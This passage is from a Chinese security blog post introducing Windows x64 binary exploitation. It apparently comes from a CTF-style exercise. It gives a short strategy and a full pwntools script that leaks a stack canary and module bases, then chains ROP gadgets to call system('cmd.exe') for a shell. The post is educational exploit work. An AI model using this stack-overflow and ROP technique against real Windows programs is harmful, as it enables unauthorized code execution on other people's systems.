+<p>程序通过<code>rsp</code> 与<code>__security_cookie</code> 异或得到的canary。</p>
+<p>思路如下：</p>
+<ol>
+<li>泄露canary，泄露程序基地址，返回到main函数重新执行</li>
+<li>泄露canary，泄露ntdll基地址，布置栈帧，执行ROP泄露<code>__security_cookie</code>，同时利用rbx控制循环次数</li>
+<li>泄露ucrtbase基地址，获取system地址与字符串cmd.exe地址</li>
+<li>执行<code>system(&quot;cmd.exe&quot;)</code> ，获取shell。</li>
+</ol>
+<p>最终wp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> code<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> warnings<br><br>warnings.filterwarnings(<span class="hljs-string">&quot;ignore&quot;</span>, category=BytesWarning)<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>p = remote(<span class="hljs-string">&#x27;192.168.0.190&#x27;</span>, <span class="hljs-number">1234</span>)<br><br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br><span class="hljs-comment"># raw_input()</span><br><br>p.sendafter(<span class="hljs-string">&#x27;input:&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0xff</span> + <span class="hljs-string">b&#x27;@&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;@&#x27;</span>)<br>canary = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lg(<span class="hljs-string">&#x27;canary&#x27;</span>, canary)<br><br>p.sendafter(<span class="hljs-string">&#x27;input:&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x117</span> + <span class="hljs-string">b&#x27;@&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;@&#x27;</span>)<br>codebase = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x12f4</span><br>lg(<span class="hljs-string">&#x27;codebase&#x27;</span>, codebase)<br><br>main_addr = codebase + <span class="hljs-number">0x1000</span><br><br>p.sendafter(<span class="hljs-string">&#x27;input:&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x100</span> + p64(canary) + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span> + p64(main_addr))<br><br><span class="hljs-comment"># raw_input()</span><br><br>p.sendafter(<span class="hljs-string">&#x27;input:&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0xff</span> + <span class="hljs-string">b&#x27;@&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;@&#x27;</span>)<br>canary = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lg(<span class="hljs-string">&#x27;canary&#x27;</span>, canary)<br><br>p.sendafter(<span class="hljs-string">&#x27;input:&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x17f</span> + <span class="hljs-string">b&#x27;@&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;@&#x27;</span>)<br>ntdll_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x5aa58</span><br>lg(<span class="hljs-string">&#x27;ntdll_base&#x27;</span>, ntdll_base)<br><br>pop_rcx_ret = ntdll_base + <span class="hljs-number">0x91719</span><br>pop_rbx_ret = ntdll_base + <span class="hljs-number">0x1297</span><br>puts_plt = codebase + <span class="hljs-number">0x10A6</span><br>security_cookie = codebase + <span class="hljs-number">0x3008</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x100</span> + p64(canary) + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span><br>payload += p64(pop_rcx_ret) + p64(security_cookie)<br>payload += p64(pop_rbx_ret) + p64(<span class="hljs-number">1</span>)<br>payload += p64(puts_plt)<br>p.sendafter(<span class="hljs-string">&#x27;input:&#x27;</span>, payload)<br><br>p.recvuntil(<span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x100</span>)<br>p.recv(<span class="hljs-number">8</span>)<br>security_cookie = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lg(<span class="hljs-string">&#x27;security_cookie&#x27;</span>, security_cookie)<br><br>old_rsp = security_cookie ^ canary<br>new_rsp = old_rsp + <span class="hljs-number">0x160</span><br>lg(<span class="hljs-string">&#x27;old_rsp&#x27;</span>, old_rsp)<br>lg(<span class="hljs-string">&#x27;new_rsp&#x27;</span>, new_rsp)<br><br>canary = new_rsp ^ security_cookie<br>puts_got = codebase + <span class="hljs-number">0x2180</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x100</span> + p64(canary) + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span><br>payload += p64(pop_rcx_ret) + p64(puts_got)<br>payload += p64(pop_rbx_ret) + p64(<span class="hljs-number">1</span>)<br>payload += p64(puts_plt)<br>p.sendafter(<span class="hljs-string">&#x27;input:&#x27;</span>, payload)<br><br>raw_input()<br><br>p.recvuntil(<span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x100</span>)<br>p.recv(<span class="hljs-number">8</span>)<br>puts = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lg(<span class="hljs-string">&#x27;puts&#x27;</span>, puts)<br>ucrtdll_base = puts - <span class="hljs-number">0x5a660</span><br>lg(<span class="hljs-string">&#x27;ucrtdll_base&#x27;</span>, ucrtdll_base)<br><br>system = ucrtdll_base + <span class="hljs-number">0xbd2a0</span><br>cmd = ucrtdll_base + <span class="hljs-number">0xe1000</span><br><br>canary = (new_rsp + <span class="hljs-number">0x160</span>) ^ security_cookie<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x100</span> + p64(canary) + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span><br>payload += p64(pop_rcx_ret) + p64(cmd)<br>payload += p64(system)<br>p.sendafter(<span class="hljs-string">&#x27;input:&#x27;</span>, payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/windows-pwn%E5%85%A5%E9%97%A8/image-20240206020022971.png" srcset="/img/loading.gif" lazyload alt="image-20240206020022971"></p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://a1ex.online/2021/05/03/Windows-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0/">https://a1ex.online/2021/05/03/Windows-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0/</a></p>
+<p><a target="_blank" rel="noopener" href="https://a1ex.online/2020/10/15/Windows-Pwn%E5%AD%A6%E4%B9%A0/">https://a1ex.online/2020/10/15/Windows-Pwn%E5%AD%A6%E4%B9%A0/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/188170">https://www.anquanke.com/post/id/188170</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.kn0sky.com/?p=160">https://www.kn0sky.com/?p=160</a></p>
+<p><a target="_blank" rel="noopener" href="https://whereisk0shl.top/hitb_gsec_ctf_babyshellcode_writeup.html">https://whereisk0shl.top/hitb_gsec_ctf_babyshellcode_writeup.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.xf1les.net/2021/10/15/introduction-to-windows-x64-pwn-part-one/">https://blog.xf1les.net/2021/10/15/introduction-to-windows-x64-pwn-part-one/</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2108?time__1311=n4+xnieDqGwxcDRgxBTroGkWO4iKPN6QwQx&alichlgref=https://cn.bing.com/">https://xz.aliyun.com/t/2108?time__1311=n4%2BxnieDqGwxcDRgxBTroGkWO4iKPN6QwQx&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F</a></p>
+<p><a target="_blank" rel="noopener" href="https://luckyfuture.top/Msfvenom-Gen-ShellCode">https://luckyfuture.top/Msfvenom-Gen-ShellCode</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/" class="category-chain-item">知识点总结</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/pwn/">#pwn</a>
+      
+        <a href="/tags/windows/">#windows</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>windows-pwn入门</div>
+      <div>http://example.com/2024/02/06/windows-pwn入门/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>l1s00t</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年2月6日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2024年2月6日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/01/22/2023-nctf-%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/" title="2023-nctf-部分赛题复现">
+                        <span class="hidden-mobile">2023-nctf-部分赛题复现</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
